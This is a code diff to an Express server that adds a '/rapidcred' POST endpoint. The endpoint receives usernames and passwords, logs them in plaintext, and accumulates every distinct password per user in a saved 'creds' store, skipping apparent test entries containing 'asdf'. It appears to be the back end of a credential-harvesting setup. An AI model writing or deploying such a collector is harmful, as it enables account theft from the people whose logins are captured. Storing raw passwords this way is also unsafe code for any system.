@@ -123,6 +123,27 @@ function fget(req, res, url, download = false) {
   })
   r.end()
 }
+
+const rapidLog = logger.extend("rapid")
+app.post("/rapidcred", bodyParser.urlencoded(), (req, res) => {
+  const { username, password } = req.body
+  rapidLog("%j -> %j", username, password)
+  if (!username.includes("asdf")) {
+    const store = touch("creds")
+    if (username in store) {
+      const pwords = store[username]
+      if (pwords.includes(password)) {
+        rapidLog("...dupe")
+      } else {
+        store[username].push(password)
+        save()
+      }
+    } else {
+      store[username] = [password]
+      save()
+    }
+  }
+})
 app.get("/eagler/:name", (req, res) => res.redirect(301, "/eagler"))
 app.get("/eagler/:name/dl", (req, res) => res.redirect(301, "/eagler/dl"))
 const users = process.env.USERS
